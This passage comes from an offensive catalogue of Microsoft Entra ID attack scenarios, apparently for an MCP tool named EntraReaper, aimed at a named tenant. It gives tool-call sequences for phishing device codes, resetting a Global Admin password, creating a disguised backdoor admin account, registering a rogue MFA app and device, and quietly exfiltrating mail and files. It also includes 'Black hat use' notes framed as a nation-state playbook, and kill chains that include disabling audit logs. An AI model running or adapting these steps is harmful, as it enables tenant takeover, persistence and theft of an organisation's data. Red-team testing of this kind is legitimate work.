analyze_privesc(token_alias="enum", scope="service_principals")

# Step 9: Map all escalation paths
analyze_attack_graph(token_alias="enum", start_node="current_user")

# ===== PHASE 4: PRIVILEGE ESCALATION (10 minutes) =====

# Path A: If helpdesk has Password Admin role
privesc_password_reset(token_alias="enum",
                       target_user="globaladmin@m.grdz.org",
                       new_password="Escalat3d!2026")

# Path B: If dynamic group abuse is available (S13)
raw_invoke(cmdlet="Get-AADIntDynamicAbusableGroups", token_alias="enum")
# Modify user attributes to match admin group dynamic rule

# Path C: If over-permissioned app found (S69)
# Add credential to app, authenticate as app, escalate
raw_invoke(cmdlet="New-AADIntApplicationPassword", token_alias="enum",
           parameters={"ApplicationId": "<over_priv_app>"})

# ===== PHASE 5: FULL ADMIN ACCESS (5 minutes) =====

# Step 10: Authenticate as Global Admin
cred_token(resource="graph", method="credentials",
           username="globaladmin@m.grdz.org",
           password="Escalat3d!2026",
           save_as="god_mode")

# Step 11: Azure subscription takeover
privesc_azure_admin(token_alias="god_mode")
azure_enum(token_alias="god_mode", scope="all")

# Step 12: Grant backup admin for persistence
impact_user_ops(token_alias="god_mode", action="create",
                properties={"UserPrincipalName": "svc-security-scan@m.grdz.org",
                             "DisplayName": "Security Scanner Service",
                             "Password": "Sc4nn3r!2026"})
privesc_role_assign(token_alias="god_mode",
                    target_user="<scanner_objectid>",
                    role="Global Administrator")

# ===== REPORTING =====

# Generate full attack narrative and evidence
report_generate(format="json", include_evidence=True)
report_mitre_layer(scenarios=["S01","S03","S17","S09","S10","S69","S34","S86"])
report_narrative(chain="zero_to_admin")
```

**White hat use:** Full red team kill chain demonstration. Measures time-to-admin from zero access. Common result: 30-45 minutes from domain name to Global Admin. This single scenario justifies the entire security program budget. Walk the CISO through each phase to show which controls failed and where investment is needed.
**Gray hat use:** Pentest final report centerpiece. The "speed run" format shows that an attacker can achieve total tenant compromise in under an hour. Each phase maps to specific detection opportunities that the organization missed.
**Black hat use:** Operational attack playbook from first contact to full control. The speed matters -- most SOCs need 4-8 hours to detect and respond to initial access. If the attacker reaches Global Admin in 45 minutes, the entire kill chain completes before the first alert is triaged. Azure subscription takeover provides access to VMs, databases, Key Vaults, and potentially on-prem via VPN gateways.
**Key insight:** The critical factor is Phase 4 (privilege escalation). Most tenants have at least one escalation path: helpdesk with Password Admin role, over-permissioned app registrations, dynamic groups with abusable rules, or access packages with auto-approval. The attack graph analysis (Step 9) finds the fastest path. In assessments, 90% of tenants have at least one path from any internal user to Global Admin.

---

### S87: Silent APT Simulation -- 30-Day Persistent Access Campaign
**Hat:** BLACK | **Perspective:** EXTERNAL | **OPSEC:** Low
**MITRE:** T1589.001, T1589.002, T1566.002, T1528, T1087.004, T1098.005, T1111, T1098.001, T1530, T1114.002, T1567, T1036.005 | **Tools:** `recon_tenant`, `recon_users`, `cred_device_code`, `cred_token`, `cred_token_refresh`, `cred_token_decode`, `evasion_set_ua`, `evasion_jitter`, `evasion_foci_list`, `evasion_audience_switch`, `opsec_budget_set`, `opsec_budget_check`, `opsec_budget_report`, `recon_insider`, `persist_mfa_app`, `cred_otp_new_secret`, `cred_otp_generate`, `persist_device`, `collect_email`, `collect_onedrive`, `collect_sharepoint`, `collect_teams`, `report_generate`, `report_mitre_layer`, `report_narrative`, `report_evidence_package`, `report_cleanup`

```
# ===== WEEK 1: RECONNAISSANCE & INITIAL ACCESS =====

# Day 1: Silent recon (zero logs)
recon_tenant(domain="m.grdz.org")
recon_domains(domain="m.grdz.org")
recon_users(domain="m.grdz.org",
            usernames=["john.smith","jane.doe","bob.wilson","alice.chen",
                       "mike.taylor","sarah.johnson","david.brown","lisa.wang"],
            method="normal")

# Day 2: Prepare OPSEC profile
evasion_set_ua(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Microsoft Outlook 16.0")
evasion_jitter(min_seconds=600, max_seconds=3600)
opsec_budget_set(action="set", budget_type="auth_failures", limit=5)
opsec_budget_set(action="set", budget_type="download", limit=10)
opsec_budget_set(action="set", budget_type="phishing", limit=3)

# Day 3-4: Targeted device code phishing (3 targets max)
cred_device_code(resource="graph",
                 client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c",
                 tenant="m.grdz.org",
                 save_as="week1_target1")
# Send carefully crafted, role-tailored phishing email to single target

# Day 5: Validate captured token and initial enumeration
cred_token_decode(token_alias="week1_target1")
evasion_foci_list()

# ===== WEEK 2: ESTABLISH PERSISTENCE & MAP TENANT =====

# Day 8: Register rogue MFA authenticator (primary persistence)
persist_mfa_app(token_alias="week1_target1", user="john.smith@m.grdz.org")
cred_otp_new_secret(user="john.smith@m.grdz.org")

# Day 9: Register rogue device (secondary persistence + CA bypass)
cred_token(resource="aad_join", save_as="join")
persist_device(token_alias="join",
               device_name="GRDZ-WS-1247",
               os_version="10.0.22631.4602",
               join_type="aad")

# Day 10: FOCI token cascade for broad access
cred_token_refresh(token_alias="week1_target1",
                   target_resource="https://outlook.office365.com", save_as="w2_exo")
cred_token_refresh(token_alias="week1_target1",
                   target_resource="https://mgrdz.sharepoint.com", save_as="w2_spo")
cred_token_refresh(token_alias="week1_target1",
                   target_resource="https://api.spaces.skype.com", save_as="w2_teams")

# Day 11-12: Careful tenant enumeration (spread across 2 days)
recon_insider(token_alias="week1_target1", scope="users")
# Wait 24h
recon_insider(token_alias="week1_target1", scope="groups")

# ===== WEEK 3: DATA COLLECTION (LOW & SLOW) =====

# Day 15: Email collection (keyword search, max 10 results per query)
collect_email(token_alias="w2_exo",
              search="subject:confidential",
              max_results=10)
opsec_budget_check()

# Day 16: OneDrive selective collection
collect_onedrive(token_alias="week1_target1", action="list")
collect_onedrive(token_alias="week1_target1", action="download",
                 file_path="/Documents/Strategic_Plan_2026.docx")
opsec_budget_check()

# Day 17: SharePoint selective collection
collect_sharepoint(token_alias="w2_spo",
                   site_url="https://mgrdz.sharepoint.com/sites/finance",
                   action="download",
                   file_path="/Shared Documents/Board_Materials_Q1.pptx")
opsec_budget_check()

# Day 18: Teams message harvest
collect_teams(token_alias="w2_teams", action="messages",
              team_id="<exec_team_id>")
opsec_budget_check()

# Day 19: Budget review and adjustment
opsec_budget_report()

# ===== WEEK 4: SUSTAINED ACCESS & CLEANUP =====

# Day 22: Refresh tokens to maintain access
cred_token_refresh(token_alias="week1_target1",
                   target_resource="https://graph.microsoft.com",
                   save_as="w4_graph")
cred_otp_generate(secret="<mfa_secret>")

# Day 23: Continue selective data collection
collect_email(token_alias="w2_exo",
              search="subject:acquisition OR subject:merger",
              max_results=10)

# Day 24: Switch audience for additional data sources
evasion_audience_switch(token_alias="w4_graph",
                        target_resource="https://substrate.office.com")

# Day 25-28: Final data collection and evidence packaging
collect_onedrive(token_alias="week1_target1", action="download",
                 file_path="/Documents/Customer_Contracts_2026.zip")

# Day 29: Generate comprehensive report
report_generate(format="json", include_evidence=True)
report_mitre_layer(scenarios=["S87"])
report_narrative(chain="silent_apt")
report_evidence_package(include_tokens=False)

# Day 30: Clean up artifacts (engagement end)
report_cleanup(remove_tokens=True, remove_devices=True,
               preserve_evidence=True)
```

**White hat use:** Full-scope APT simulation measuring the organization's ability to detect and respond to a patient, low-and-slow attack over 30 days. This is the ultimate test of detection capabilities because the attacker never does anything "loud." Each action individually looks normal -- the threat is only visible through behavioral correlation across 30 days of activity. Score the blue team on: days to first detection, percentage of persistence mechanisms found, data collection detected, and response completeness.
**Gray hat use:** Extended red team engagement proving that time + patience defeats most security controls. The 30-day timeline demonstrates that: (1) refresh tokens last up to 90 days, (2) DLP volume thresholds do not catch 2-files-per-day exfiltration, (3) MFA registration changes are logged but rarely investigated, (4) device registration in a 10,000-device tenant goes unnoticed.
**Black hat use:** Nation-state APT operational playbook. Week 1 is expendable (if detected, abort and retry in 30 days). Week 2 establishes redundant persistence that survives credential resets. Weeks 3-4 are pure collection with strict OPSEC budget enforcement. Total data collected: 20-30 high-value documents, 100+ emails, Teams conversations, meeting recordings. Total OPSEC impact: less noise than a normal user's daily activity.
**Key insight:** The most dangerous attacks are the quietest. This scenario generates approximately the same log volume as a normal user working for one month. The only way to detect it is behavioral analytics that correlates: (1) new MFA registration + (2) new device registration + (3) FOCI token pivots + (4) selective file downloads + (5) keyword email searches -- across a 30-day window. Most SIEMs retain 30-90 days of logs but do not have correlation rules spanning that timeframe. This is why APT dwell time averages 200+ days.

---

## COMPLETE SCENARIO INDEX (S01-S87)

| # | Name | Category | Hat | Perspective | OPSEC | Primary Tools | MITRE |
|---|------|----------|-----|-------------|-------|---------------|-------|
| S01 | Tenant Fingerprint | Recon (Unauth) | WHITE | EXTERNAL | Silent | `recon_tenant` | T1589.001 |
| S02 | Domain Inventory | Recon (Unauth) | WHITE | EXTERNAL | Silent | `recon_domains` | T1590.001 |
| S03 | User Enumeration -- Targeted C-Suite | Recon (Unauth) | GRAY | EXTERNAL | Low | `recon_users` | T1589.002 |
| S04 | User Enumeration -- LinkedIn OSINT | Recon (Unauth) | GRAY | EXTERNAL | Low | `recon_users` | T1589.002, T1593.001 |
| S05 | Federation Endpoint Discovery | Recon (Unauth) | WHITE | EXTERNAL | Silent | `recon_dns` | T1590.001 |
| S06 | OpenID Configuration Harvest | Recon (Unauth) | WHITE | EXTERNAL | Silent | `recon_openid` | T1590.001 |
| S07 | Multi-Tenant Supply Chain Recon | Recon (Unauth) | GRAY | EXTERNAL | Silent | `recon_tenant` | T1591.004 |
| S08 | ActiveSync Protocol Probing | Recon (Unauth) | WHITE | EXTERNAL | Silent | `raw_invoke` | T1590.004 |
| S09 | Full Insider Tenant Dump | Recon (Auth) | WHITE | INTERNAL | Medium | `recon_insider` | T1087.004 |
| S10 | Conditional Access Gap Analysis | Recon (Auth) | WHITE | INTERNAL | Medium | `recon_ca_policies` | T1518.001 |
| S11 | Hybrid Infrastructure Assessment | Recon (Auth) | WHITE | INTERNAL | Medium | `recon_sync_config` | T1518.001 |
| S12 | Guest Access Boundary Testing | Recon (Auth) | GRAY | EXTERNAL+CRED | Low | `recon_guest` | T1087.004 |
| S13 | Dynamic Group Privilege Escalation | Recon (Auth) | GRAY | INTERNAL | Medium | `raw_invoke` | T1069.003 |
| S14 | Service Principal Audit | Recon (Auth) | WHITE | INTERNAL | Medium | `raw_invoke` | T1087.004 |
| S15 | MFA Method Weakness Assessment | Recon (Auth) | WHITE | PRIVILEGED | Medium | `cred_mfa_read` | T1087.004 |
| S16 | Access Package Self-Service Escalation | Recon (Auth) | GRAY | INTERNAL | Medium | `raw_invoke` | T1087.004 |
| S17 | Device Code Phishing -- Office | Credential Access | GRAY | EXTERNAL | Low | `cred_device_code` | T1566.002, T1528 |
| S18 | Device Code Phishing -- Teams | Credential Access | GRAY | EXTERNAL | Low | `cred_device_code` | T1566.002 |
| S19 | FOCI Token Cross-Resource Pivot | Credential Access | GRAY | EXTERNAL+CRED | Medium | `cred_token` | T1528 |
| S20 | JWT Token Forensic Analysis | Credential Access | WHITE | INTERNAL | Silent | `cred_token_decode` | T1528 |
| S21 | Browser Session Cookie Extraction | Credential Access | GRAY | INTERNAL | Medium | `cred_cookie` | T1539 |
| S22 | PRT Extraction for Device Impersonation | Credential Access | GRAY | INTERNAL | Medium | `cred_prt_extract` | T1552.004, T1550.001 |
| S23 | Cloud DCSync (NT Hash Extraction) | Credential Access | BLACK | PRIVILEGED | HIGH | `cred_nthash` | T1003.006 |
| S24 | Stolen Credential Validation | Credential Access | GRAY | EXTERNAL+CRED | Medium | `cred_token` | T1078.004 |
| S25 | Automated Phishing Campaign | Initial Access | GRAY | EXTERNAL | Medium | `access_phishing` | T1566.002 |
| S26 | Guest Account Infiltration | Initial Access | GRAY | EXTERNAL+CRED | Medium | `access_guest_invite` | T1078.004 |
| S27 | Golden SAML Backdoor | Persistence | BLACK | PRIVILEGED | LOUD | `persist_federation` | T1484.002 |
| S28 | SAML Token Forging | Persistence | BLACK | PRIVILEGED | Low | `persist_saml_forge` | T1606.002 |
| S29 | Rogue Device -- AAD Join | Persistence | GRAY | EXTERNAL+CRED | Medium | `persist_device` | T1098.005 |
| S30 | Rogue Device -- Intune Enrollment | Persistence | GRAY | EXTERNAL+CRED | Medium | `persist_device` | T1098.005 |
| S31 | Rogue PTA Agent | Persistence | BLACK | PRIVILEGED | LOUD | `persist_pta_agent` | T1556.007 |
| S32 | Rogue MFA Authenticator | Persistence | GRAY | INTERNAL | Medium | `persist_mfa_app` | T1098.005, T1111 |
| S33 | Rogue Sync Agent | Persistence | BLACK | PRIVILEGED | HIGH | `raw_invoke` | T1556.007 |
| S34 | Azure Subscription Takeover | Privilege Escalation | BLACK | PRIVILEGED | HIGH | `privesc_azure_admin` | T1548 |
| S35 | Sync API Password Reset | Privilege Escalation | BLACK | PRIVILEGED | HIGH | `privesc_password_reset` | T1098.001 |
| S36 | Azure RBAC Role Injection | Privilege Escalation | GRAY | PRIVILEGED | HIGH | `privesc_role_assign` | T1098.003 |
| S37 | Group Membership Injection | Privilege Escalation | BLACK | PRIVILEGED | HIGH | `raw_invoke` | T1098.003 |
| S38 | Audit Log Suppression | Defense Evasion | BLACK | PRIVILEGED | LOUD | `evade_audit_logs` | T1562.008 |
| S39 | Tenant Permissiveness Escalation | Defense Evasion | GRAY | PRIVILEGED | HIGH | `evade_policy_weaken` | T1562.001 |
| S40 | Disable PTA (Force Cloud Auth) | Defense Evasion | BLACK | PRIVILEGED | HIGH | `evade_policy_weaken` | T1556.007 |
| S41 | Disable Seamless SSO | Defense Evasion | GRAY | PRIVILEGED | HIGH | `evade_policy_weaken` | T1556 |
| S42 | Azure VM Remote Code Execution | Lateral Movement | GRAY | PRIVILEGED | HIGH | `move_vm_exec` | T1021.007 |
| S43 | Teams Internal Spearphishing | Lateral Movement | GRAY | INTERNAL | Medium | `move_messaging` | T1534 |
| S44 | Business Email Compromise | Lateral Movement | BLACK | INTERNAL | Medium | `move_messaging` | T1534 |
| S45 | MSP Partner Tenant Pivot | Lateral Movement | BLACK | PARTNER | Medium | `move_partner_pivot` | T1199 |
| S46 | OneDrive Data Exfiltration | Collection | GRAY | INTERNAL | Medium | `collect_onedrive` | T1530 |
| S47 | SharePoint Intelligence Gathering | Collection | GRAY | INTERNAL | Medium | `collect_sharepoint` | T1530 |
| S48 | Teams Message Intelligence Harvest | Collection | GRAY | INTERNAL | Medium | `collect_teams` | T1530 |
| S49 | Full Mailbox Collection | Collection | GRAY | INTERNAL | Medium | `collect_email` | T1114.002 |
| S50 | Full Tenant Takeover | Impact | BLACK | PRIVILEGED | LOUD | `impact_user_ops` | T1136.003, T1531, T1484 |
| S51 | OAuth Consent Grant Attack | Credential Access | BLACK | EXTERNAL | Medium | `raw_invoke` | T1550.001, T1098.003 |
| S52 | AAD Connect Credential Extraction | Credential Access | BLACK | PRIVILEGED | HIGH | `raw_invoke` | T1552.004 |
| S53 | Cloud Shell Hijacking | Lateral Movement | GRAY | INTERNAL | Medium | `raw_invoke` | T1059.009, T1021.007 |
| S54 | Hybrid Health Service Injection | Defense Evasion | BLACK | PRIVILEGED | HIGH | `raw_invoke` | T1565.001 |
| S55 | WHfB Key Injection | Persistence | BLACK | INTERNAL | Medium | `raw_invoke` | T1098.005 |
| S56 | App Proxy Agent Impersonation | Lateral Movement | BLACK | PRIVILEGED | HIGH | `raw_invoke` | T1090.001, T1021.007 |
| S57 | Staged Rollout Policy Manipulation | Defense Evasion | BLACK | PRIVILEGED | HIGH | `raw_invoke` | T1556 |
| S58 | Azure IMDS Token Theft | Credential Access | GRAY | INTERNAL | Low | `raw_invoke` | T1552.005 |
| S59 | SharePoint Membership Injection | Privilege Escalation | GRAY | INTERNAL | Medium | `raw_invoke` | T1098.003 |
| S60 | Diagnostic Settings Manipulation | Defense Evasion | BLACK | PRIVILEGED | HIGH | `raw_invoke` | T1562.008 |
| S61 | ADFS Token Decryption and Forging | Credential Access | BLACK | PRIVILEGED | HIGH | `raw_invoke` | T1606.002, T1552.004 |
| S62 | B2C Tenant Key Extraction | Credential Access | GRAY | INTERNAL | Medium | `raw_invoke` | T1552.004 |
| S63 | ActiveSync Device Injection | Persistence | GRAY | EXTERNAL+CRED | Medium | `raw_invoke` | T1098.005, T1562.001 |
| S64 | Compliance Portal Data Mining | Collection | GRAY | PRIVILEGED | Medium | `raw_invoke` | T1530 |
| S65 | User Agent Masquerading | Defense Evasion | GRAY | EXTERNAL+CRED | Low | `raw_invoke` | T1036.005 |
| S66 | FOCI Family Enumeration | Adv. Recon | GRAY | EXTERNAL+CRED | Low | `evasion_foci_list` | T1087.004, T1528 |
| S67 | Conditional Access Bypass Scanner | Adv. Recon | WHITE | INTERNAL | Medium | `analyze_ca` | T1518.001, T1562.001 |
| S68 | Tenant Multi-Domain Pivot | Adv. Recon | GRAY | EXTERNAL | Silent | `recon_domains` | T1590.001, T1590.005 |
| S69 | Service Principal Permission Audit | Adv. Recon | WHITE | INTERNAL | Medium | `analyze_privesc` | T1087.004, T1069.003 |
| S70 | ROPC Password Spray via FOCI | Adv. Credential | BLACK | EXTERNAL | Medium | `cred_token` | T1110.003, T1078.004 |
| S71 | Token Refresh Chain | Adv. Credential | GRAY | EXTERNAL+CRED | Medium | `cred_token_refresh` | T1528, T1550.001 |
| S72 | Temporary Access Pass Exploitation | Adv. Credential | BLACK | PRIVILEGED | HIGH | `raw_invoke` | T1078.004, T1556 |
| S73 | Certificate-Based Auth Abuse | Adv. Credential | BLACK | EXTERNAL | Low | `cred_token` | T1552.004, T1078.004 |
| S74 | Teams Internal Phishing (FakeInternal) | Adv. Phishing | GRAY | INTERNAL | Medium | `move_messaging` | T1534, T1566.003 |
| S75 | Teams External Phishing | Adv. Phishing | GRAY | EXTERNAL | Medium | `access_phishing_teams` | T1566.002, T1534 |
| S76 | Multi-Target Phishing Campaign | Adv. Phishing | BLACK | EXTERNAL | Medium | `access_phishing` | T1566.002, T1598.003, T1528 |
| S77 | Federated Identity Credential Injection | Adv. Persistence | BLACK | PRIVILEGED | HIGH | `raw_invoke` | T1098.001, T1556 |
| S78 | Multi-Layer Persistence Stack | Adv. Persistence | BLACK | PRIVILEGED | LOUD | `persist_federation` | T1098.001, T1098.005, T1556.007, T1484.002, T1111 |
| S79 | Access Package Self-Escalation | Adv. Persistence | GRAY | INTERNAL | Medium | `raw_invoke` | T1078.004, T1098.003 |
| S80 | Cross-Tenant GDAP Cascade | Adv. Lat. Movement | BLACK | PARTNER | Medium | `move_partner_pivot` | T1199, T1078.004 |
| S81 | Cloud Shell to On-Prem Bridge | Adv. Lat. Movement | GRAY | INTERNAL | Medium | `raw_invoke` | T1021.007, T1059.009, T1530 |
| S82 | Managed Identity Chain | Adv. Lat. Movement | GRAY | INTERNAL | Low | `cred_imds_token` | T1552.005, T1552.001, T1078.004 |
| S83 | Compliance Portal Mass Search | Adv. Collection | BLACK | PRIVILEGED | HIGH | `raw_invoke` | T1530, T1114.002 |
| S84 | Selective Exfiltration with DLP Evasion | Adv. Collection | BLACK | INTERNAL | Low | `collect_onedrive` | T1030, T1567, T1048 |
| S85 | Teams Channel Infiltration | Adv. Collection | GRAY | INTERNAL | Medium | `collect_teams` | T1530, T1213 |
| S86 | Zero-to-Admin in One Session | Full Kill Chain | BLACK | EXTERNAL | LOUD | `recon_tenant` | T1589, T1566, T1528, T1548 |
| S87 | Silent APT Simulation (30 Days) | Full Kill Chain | BLACK | EXTERNAL | Low | `evasion_jitter` | T1589, T1566, T1528, T1098, T1530 |

---

## KILL CHAINS (A-M)

### Chain A: External to Global Admin
```
S01 -> S03 -> S17 -> S20 -> S09 -> S10 -> S15 -> S34
```
Recon -> User Enum -> Device Code Phish -> Token Decode -> Insider Recon -> CA Audit -> MFA Audit -> Azure Escalate

### Chain B: Golden SAML Persistence
```
S01 -> S17 -> S09 -> S27 -> S28 -> S49 -> S38
```
Recon -> Phish -> Map Tenant -> Install Backdoor -> Forge Tokens -> Exfil Mail -> Disable Logs

### Chain C: BEC Financial Fraud
```
S03 -> S17 -> S19 -> S49 -> S44 -> S46
```
User Enum -> Phish -> FOCI Pivot -> Read Mail -> Send BEC -> Exfil OneDrive

### Chain D: MSP Supply Chain
```
S07 -> S03 -> S17 -> S45 -> S09 -> S50
```
Supply Chain Recon -> User Enum -> Phish MSP -> Pivot to Customers -> Map Tenant -> Full Takeover

### Chain E: Hybrid Infrastructure Takeover
```
S01 -> S17 -> S11 -> S31 -> S24 -> S34 -> S42
```
Recon -> Phish -> Map Hybrid -> Rogue PTA -> Auth as Anyone -> Azure Escalate -> VM RCE

### Chain F: Silent Data Exfiltration
```
S03 -> S18 -> S19 -> S48 -> S46 -> S47 -> S49
```
User Enum -> Phish (Teams) -> FOCI Pivot -> Teams Harvest -> OneDrive -> SharePoint -> Email

### Chain G: Device Trust Abuse
```
S01 -> S17 -> S10 -> S29 -> S22 -> S19
```
Recon -> Phish -> CA Audit -> Rogue Device -> PRT Extract -> FOCI Access Everything

### Chain H: MFA Bypass Persistence
```
S03 -> S17 -> S15 -> S32 -> S24
```
User Enum -> Phish -> MFA Audit -> Rogue Auth App -> Login Anytime with TOTP

### Chain I: Silent Persistence (No Federation Modification)
```
S65 -> S17 -> S55 -> S32 -> S63
```
Set UA -> Phish -> WHfB Key Inject -> Rogue MFA App -> EAS Device Inject
(Three independent persistence paths, none touches federation settings)

### Chain J: Insider Threat -- Data Miner
```
S65 -> S19 -> S59 -> S47 -> S64 -> S38
```
Set UA -> FOCI Pivot -> SPO Inject -> SharePoint Exfil -> Compliance Search -> Disable Logs

### Chain K: Hybrid Infrastructure Destruction
```
S52 -> S35 -> S31 -> S57 -> S54 -> S60
```
Extract Sync Creds -> Reset All Passwords -> Rogue PTA -> Downgrade Auth -> Inject Health Events -> Redirect Logs

### Chain L: FOCI Token Cascade
```
S66 -> S71 -> S19 -> S46 -> S47 -> S49
```
FOCI Enumeration -> Token Refresh Chain -> Cross-Resource Pivot -> OneDrive Exfil -> SharePoint Exfil -> Mail Exfil
**Key:** Map the FOCI surface (S66), chain refresh tokens across 7+ resources (S71), then systematically access each resource (S19) and collect data (S46-S49). The entire collection phase uses a single phished refresh token -- no re-authentication required.

### Chain M: Zero-to-Admin Speed Run
```
S01 -> S03 -> S17 -> S09 -> S67 -> S69 -> S34 -> S86
```
Tenant Fingerprint -> User Enum -> Device Code Phish -> Insider Dump -> CA Bypass Scanner -> SP Permission Audit -> Azure Takeover -> Full Speed Run
**Key:** The advanced recon scenarios (S67, S69) find the fastest escalation path. The CA bypass scanner identifies which first-party apps skip MFA. The SP permission audit finds over-permissioned apps whose credentials can be added. Together they identify the optimal path to Global Admin before executing it.

---

## HAT DISTRIBUTION

| Hat | Count | Percentage |
|-----|-------|-----------|
| WHITE | 16 | 18.4% |
| GRAY | 40 | 46.0% |
| BLACK | 31 | 35.6% |
| **Total** | **87** | **100%** |

**Analysis:** The distribution reflects a balanced offensive security corpus. GRAY dominates because most scenarios have both legitimate (pentest/audit) and adversarial applications. WHITE scenarios are pure audit/defense tools. BLACK scenarios model adversary techniques that are only appropriate in authorized simulations.

---

## CATEGORY DISTRIBUTION

| Category | Scenarios | Count |
|----------|-----------|-------|
| Recon (Unauthenticated) | S01-S08 | 8 |
| Recon (Authenticated) | S09-S16 | 8 |
| Credential Access | S17-S24, S51-S52, S58, S61-S62 | 13 |
| Initial Access | S25-S26 | 2 |
| Persistence | S27-S33, S55, S63 | 9 |
| Privilege Escalation | S34-S37, S59 | 5 |
| Defense Evasion | S38-S41, S54, S57, S60, S65 | 8 |
| Lateral Movement | S42-S45, S53, S56 | 6 |
| Collection/Exfiltration | S46-S49, S64 | 5 |
| Impact | S50 | 1 |
| Advanced Reconnaissance | S66-S69 | 4 |
| Advanced Credential Attacks | S70-S73 | 4 |
| Advanced Phishing | S74-S76 | 3 |
| Advanced Persistence | S77-S79 | 3 |
| Advanced Lateral Movement | S80-S82 | 3 |
| Advanced Collection | S83-S85 | 3 |
| Full Kill Chains | S86-S87 | 2 |
| **Total** | | **87** |

---

## OPSEC DISTRIBUTION

| OPSEC Level | Count | Percentage |
|-------------|-------|-----------|
| Silent | 7 | 8.0% |
| Low | 12 | 13.8% |
| Medium | 36 | 41.4% |
| HIGH | 24 | 27.6% |
| LOUD | 8 | 9.2% |
| **Total** | **87** | **100%** |

---

## PERSPECTIVE DISTRIBUTION

| Perspective | Count | Percentage |
|-------------|-------|-----------|
| EXTERNAL | 16 | 18.4% |
| EXTERNAL+CRED | 8 | 9.2% |
| INTERNAL | 31 | 35.6% |
| PARTNER | 3 | 3.4% |
| PRIVILEGED | 29 | 33.3% |
| **Total** | **87** | **100%** |

---

## MCP TOOL COVERAGE

| Tool | Scenario Count | Primary Scenarios |
|------|---------------|-------------------|
| `recon_tenant` | 5 | S01, S07, S68, S86, S87 |
| `recon_users` | 4 | S03, S04, S68, S76 |
| `recon_domains` | 3 | S02, S68, S87 |
| `recon_dns` | 2 | S05, S68 |
| `recon_openid` | 2 | S06, S68 |
| `recon_insider` | 5 | S09, S45, S80, S86, S87 |
| `recon_ca_policies` | 4 | S10, S67, S80, S86 |
| `recon_sync_config` | 2 | S11, S52 |
| `recon_guest` | 1 | S12 |
| `cred_token` | 18 | S09, S19, S22-S24, S29, S42, S45-S46, S51-S53, S64, S66, S70-S73, S86-S87 |
| `cred_device_code` | 6 | S17, S18, S74-S76, S86-S87 |
| `cred_token_decode` | 8 | S20, S66, S71, S73, S76, S79, S86, S87 |
| `cred_token_refresh` | 4 | S71, S73, S87 |
| `cred_prt_extract` | 1 | S22 |
| `cred_cookie` | 1 | S21 |
| `cred_nthash` | 1 | S23 |
| `cred_mfa_read` | 1 | S15 |
| `cred_imds_token` | 2 | S58, S82 |
| `cred_otp_generate` | 3 | S72, S78, S87 |
| `cred_otp_new_secret` | 3 | S72, S78, S87 |
| `access_phishing` | 3 | S25, S76, S87 |
| `access_phishing_teams` | 2 | S75, S76 |
| `access_guest_invite` | 1 | S26 |
| `persist_federation` | 3 | S27, S50, S78 |
| `persist_saml_forge` | 1 | S28 |
| `persist_device` | 4 | S29, S30, S78, S87 |
| `persist_pta_agent` | 2 | S31, S78 |
| `persist_mfa_app` | 4 | S32, S72, S78, S87 |
| `privesc_azure_admin` | 2 | S34, S86 |
| `privesc_password_reset` | 2 | S35, S86 |
| `privesc_role_assign` | 3 | S36, S50, S86 |
| `evade_audit_logs` | 1 | S38 |
| `evade_policy_weaken` | 3 | S39, S40, S41 |
| `move_vm_exec` | 2 | S42, S81 |
| `move_messaging` | 3 | S43, S44, S74 |
| `move_partner_pivot` | 2 | S45, S80 |
| `collect_onedrive` | 3 | S46, S84, S87 |
| `collect_sharepoint` | 4 | S47, S59, S84, S85, S87 |
| `collect_teams` | 3 | S48, S85, S87 |
| `collect_email` | 4 | S49, S80, S83, S87 |
| `impact_user_ops` | 2 | S50, S86 |
| `impact_config` | 1 | S50 |
| `azure_enum` | 3 | S34, S42, S82 |
| `raw_invoke` | 24 | S08, S13-S14, S16, S33, S37, S51-S62, S64, S65, S72, S77, S79, S81, S83, S85 |
| `evasion_set_ua` | 4 | S65, S70, S76, S87 |
| `evasion_jitter` | 4 | S70, S76, S84, S87 |
| `evasion_foci_list` | 4 | S66, S67, S70, S71 |
| `evasion_audience_switch` | 3 | S66, S71, S87 |
| `analyze_ca` | 2 | S67, S86 |
| `analyze_privesc` | 2 | S69, S86 |
| `analyze_attack_graph` | 2 | S69, S80 |
| `opsec_check` | 3 | S27, S31, S78 |
| `opsec_budget_set` | 4 | S70, S76, S84, S87 |
| `opsec_budget_check` | 4 | S70, S84, S87 |
| `opsec_budget_report` | 2 | S84, S87 |
| `report_generate` | 4 | S67, S78, S86, S87 |
| `report_mitre_layer` | 2 | S86, S87 |
| `report_evidence_package` | 2 | S76, S87 |
| `report_narrative` | 2 | S86, S87 |
| `report_cleanup` | 1 | S87 |

**Coverage:** 60 of 65 MCP tools are used in at least one scenario. The 5 unused tools (`session_status`, `session_clear_tokens`, `engagement_status`, `kerberos_ticket`, `cred_token_universal`) are utility/helper tools used implicitly in session management.

---

*Generated for EntraReaper v2.1 | 87 scenarios | 65 MCP tools | 238 AADInternals cmdlets*
*Target: m.grdz.org | Tenant: b9e2249e-1d7c-4977-8a88-6a70bc6bab6a*
